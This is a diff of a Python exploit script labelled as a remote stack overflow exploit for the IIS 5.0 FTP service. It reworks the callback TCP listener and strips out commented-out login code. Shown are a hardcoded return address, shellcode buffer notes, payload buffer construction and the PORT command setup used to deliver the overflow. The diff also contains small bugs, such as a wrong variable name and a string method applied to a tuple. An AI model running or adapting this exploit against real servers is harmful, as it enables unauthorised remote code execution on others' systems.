@@ -8,6 +8,7 @@ import string
 import threading
 from struct import pack
 from ftplib import FTP
+import SocketServer
 
 #Shellcode 490 bytes including nops
 # This is for the stored payload, the real BadChar list for file paths is:
@@ -138,15 +139,25 @@ def build_directory_buffer(egg,patch,ret):
     directory_buffer = pre+pst
     return directory_buffer
 
-def create_tcp_server():
-    svr_bind_ip = "0.0.0.0"
-    global svr_bind_port
-    svr_bind_port = 9999
-    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    server.bind((svr_bind_ip, svr_bind_port))
-    server.listen(5)
-    #print "[*] Listening on %s:%d" %(svr_bind_ip,svr_bind_port)
+class ThreadedTCPRequestHandler(SocketServer.BaseRequestHandler):
+    def handle(self):
+        data = self.request.recv(1024)
+        cur_thread = threading.current_thread()
+        #response = "{}: {}".format(cur_thread.name, data)
+        #self.request.sendall(response)
 
+class ThreadedTCPServer(SocketServer.ThreadingMixIn, SocketServer.TCPServer):
+    pass
+
+def create_tcp_server(HOST="0.0.0.0", PORT=0):
+    server = ThreadedTCPServer((HOST, PORT), ThreadedTCPRequestHandler)
+    # Start a thread with the server -- that thread will then start one
+    # more thread for each request
+    server_thread = threading.Thread(target=server.serve_forever)
+    # Exit the server thread when the main thread terminates
+    server_thread.daemon = True
+    server_thread.start()
+    return server
 
 def main():
     print "IIS 5.0 FTP Remote Stack Overflow Exploit by Disc0rdantMel0dy"
@@ -157,17 +168,10 @@ def main():
         ftp_server = FTP()
         print "[+] Connecting to FTP Server: %s on port %d" % (ip, port)
         ftp_server.connect(ip,port,timeout=30)        
-        #sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-        #sock.settimeout(30)
-        #sock.connect((ip,port))
+        
         print "[+] Connected! Waiting for welcome banner..."
         print ftp.getwelcome()
-        #data = sock.recv(1024)
-        #if data:
-        #    print data
-        #else:
-        #    "[!] Socket timed out while waiting for welcome banner. Exiting..."
-        #    sys.exit(-1)                
+         
     except:
         print "[!] Could not connect to FTP Server: %s on port %d" % (ip, port)
         sys.exit(-1)
@@ -180,26 +184,6 @@ def main():
     except:
         "[!] Invalid FTP Credentials. If using default credentials please try again specifying valid credentials.  Exiting..."
         sys.exit(-1)
-    #data = sock.send("USER %s" % ftp_user)
-    #print "[+] Sent: USER %s" % ftp_user
-    #data = sock.recv(1024)
-    #print data
-    
-    #if not str(data).startswith("331"):
-        #print "[!] Unexpected response from FTP Server.  Exiting..."
-        #sys.exit(-1)
-    #data = sock.send("PASS %s" % ftp_pass)
-    #print "[+] Sent: PASS %s" % ftp_pass
-    #data = sock.recv(1024)
-    #print data
-    #if str(data).startswith("230"):
-        #print "[+] Successfully logged in with creds: %s / %s" %(ftp_user,ftp_pass)
-    #elif str(data).startswith("530"):
-        #"[!] Invalid FTP Credentials. If using default credentials please try again specifying valid credentials.  Exiting..."
-        #sys.exit(-1)
-    #else:
-        #print "[!] Unexpected response from FTP Server.  Exiting..."
-        #sys.exit(-1)
     
     ret = pack('<i', 0x77e42ed8)
     print "[+] Using return address of %s" % string2hex(ret)
@@ -236,11 +220,11 @@ def main():
     #start TCP server for FTP server to connect to
     srv = create_tcp_server()
     #get info for PORT address
-    srv_info = list(srv.getsockname())
-    srv_port1 = srv_info[1] / 256
-    srv_port2 = srv_info[1] % 256
+    srv_port1 = srv.server_address[1] / 256
+    srv_port2 = srv.server_address[1] % 256
     #build address for PORT command
-    srv_address = "%s,%s,%s" % (srv_info[0].replace(".",","), srv_port1, srv_port2)
+    srv_address = "%s,%s,%s" % (srv.server_address.replace(".",","), srv_port1, srv_port2)
+    
     #send PORT command
     ftp_server.sendcmd("PORT %s" % srv_address)
     
